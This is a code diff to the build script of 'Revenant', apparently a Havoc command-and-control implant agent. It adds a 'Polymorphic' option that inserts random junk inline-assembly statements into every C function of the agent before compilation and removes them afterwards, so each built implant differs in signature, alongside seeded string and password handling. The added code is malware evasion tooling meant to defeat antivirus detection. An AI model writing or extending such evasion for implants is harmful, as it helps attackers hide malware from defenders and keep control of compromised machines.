@@ -1,6 +1,10 @@
 import binascii
 import subprocess
 import glob
+import os
+import re
+import random
+import sys
 
 from base64 import b64decode
 from havoc.service import HavocService
@@ -23,11 +27,17 @@ password_hex = ", ".join(f"0x{b:02x}" for b in password_bytes)
 seed_str: str = ''.join(random.choices(string.ascii_letters, k=8))
 GENERATED_SEED = int(binascii.crc32(seed_str.encode())) # 0xDEADDEAD
 
-#     "#define SEED 0xDEADDEAD"
-#     "#define S_XK                     \"PUNICODE_STRING\""
-# print(GENERATED_SEED)
-# print(GENERATED_PASSWORD)
+directory_path = "./Agent/Source/"
 
+instructions = [
+    "nop",
+    "mov eax, ebx",
+    "add rax, 5",
+    "inc rax",
+    "dec rax",
+    "xor rax, rax",
+    "mov rax, rcx"
+]
 
 plain_function_strings = [
     "#define RtlRandomEx_CRC32B                     \"RtlRandomEx\"",
@@ -293,8 +303,16 @@ class Revenant(AgentType):
             process_strings_h()
             print("[*] Configuring String.h header...")
 
+        if self.BuildingConfig["Polymorphic"]:
+            process_directory(directory_path, instructions, False)
+            print("[*] Configuring source files...")
+
         # compile_command: str = "cd ./Agent && make"
         compile_command: str = "cmake . && cmake --build . -j 1"
+
+        if self.BuildingConfig["Polymorphic"]:
+            process_directory(directory_path, instructions, True)
+            print("[*] Cleaning up source files...")
 
         try:
             process = subprocess.run(compile_command,
@@ -406,6 +424,52 @@ class Revenant(AgentType):
         return b''
 
 
+def insert_asm_statements(file_contents, instructions):
+    # Regex pattern to match C functions
+    function_pattern = re.compile(
+        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
+        re.MULTILINE
+    )
+
+
+    # Function to insert random asm statements with "//remove me" comments
+    def insert_asm(match):
+        asm_statements = "\n".join(
+            "//remove me\nasm(\"{}\");".format(random.choice(instructions)) for _ in range(len(instructions))
+        )
+        return match.group(0) + "\n" + asm_statements
+
+    # Replace matched functions with modified version
+    modified_contents = function_pattern.sub(insert_asm, file_contents)
+
+    return modified_contents
+
+
+def remove_asm_statements(file_contents):
+    # Regex pattern to match and remove lines after "//remove me" comments
+    remove_pattern = re.compile(r"//remove me\n.*;\n?", re.MULTILINE)
+    modified_contents = remove_pattern.sub("", file_contents)
+    return modified_contents
+
+
+def process_c_file(file_path, instructions, remove=False):
+    with open(file_path, 'r') as input_file:
+        file_contents = input_file.read()
+
+    if remove:
+        modified_contents = remove_asm_statements(file_contents)
+    else:
+        modified_contents = insert_asm_statements(file_contents, instructions)
+
+    with open(file_path, 'w') as output_file:
+        output_file.write(modified_contents)
+
+
+def process_directory(directory_path, instructions, remove=False):
+    for filename in os.listdir(directory_path):
+        if filename.endswith('.c'):
+            file_path = os.path.join(directory_path, filename)
+            process_c_file(file_path, instructions, remove)
 def main():
     havoc_revenant: Revenant = Revenant()
 
